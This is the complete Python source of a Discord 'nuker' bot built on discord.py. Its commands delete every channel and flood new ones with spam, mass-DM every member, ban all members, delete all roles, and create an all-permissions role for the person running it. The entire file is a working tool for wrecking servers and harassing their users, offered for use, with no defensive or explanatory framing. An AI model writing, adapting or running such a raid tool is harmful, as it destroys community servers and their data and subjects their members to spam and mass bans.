# packages
import discord
from discord.ext import commands
import asyncio
from dotenv import load_dotenv
import os
import requests
import json

# config
load_dotenv()
TOKEN = os.getenv("TOKEN")

config = {
    "Prefix": ".",
    "Status": os.getenv("STATUS", "your server"),
}

# intents
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=config["Prefix"], intents=intents)


# events
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} ({bot.user.id})")
    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Activity(
            type=discord.ActivityType.watching, name=config["Status"]
        ),
    )

    print(
        f"Invite: https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=157712&scope=bot"
    )

    print("\n----LOGS----\n")


@bot.event
async def on_command_error(ctx, error):
    await ctx.send(error)
    print(f"[ERROR] {error}")


# commands
@bot.command()
async def nuke(ctx, channelCount, messages, channelName, *, message):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"Deleted channel {channel.name}")

        except Exception as error:
            print(f"Couldn't delete channel {channel.name}: {error}")

    for i in range(int(channelCount)):
        try:
            channel = await ctx.guild.create_text_channel(name=channelName)
            print(f"Created text channel: {channelName}")

            for j in range(int(messages)):
                await channel.send(message)
        except Exception as error:
            print(f"Couldn't create text channel {channelName}: {error}")


@bot.command()
async def dm(ctx, amount, *, message):
    for i in range(int(amount)):
        for member in ctx.guild.members:
            try:
                await member.send(message)
                print("Sent to {member.display_name} ({member.id}).")
            except discord.Forbidden:
                print(
                    f"Couldn't send a message to {member.display_name} ({member.id}). They may have DMs disabled or have blocked the bot."
                )
            except Exception as error:
                print(
                    f"An error occurred while sending a message to {member.display_name} ({member.id}): {error}"
                )


@bot.command()
@commands.has_permissions(ban_members=True)
async def banall(ctx):
    if ctx.guild.get_member(bot.user.id).guild_permissions.ban_members == False:
        print("[ERROR] Bot does not have ban permissions")
        return

    for member in ctx.guild.members:
        try:
            await ctx.guild.ban(member)

        except Exception as error:
            print(f"Failed to ban {member}")


@bot.command()
async def deleteroles(ctx):
    for role in ctx.guild.roles:
        try:
            await role.delete()
            print("Role has been deleted")
        except Exception as error:
            print(f"Failed to delete role")


@bot.command()
async def hoist(ctx, name):
    try:
        role = await ctx.guild.create_role(
            name=name, permissions=discord.Permissions.all()
        )

        await ctx.author.add_roles(role)

        print("Role has been added")
    except Exception as error:
        print(f"Failed to give role: {error}")


bot.remove_command("help")


@bot.command()
async def help(ctx):
    command_list = [f".{command.name}" for command in bot.commands]
    commands_text = "\n".join(command_list)
    await ctx.send(f"Available commands:\n{commands_text}")


bot.run(TOKEN)
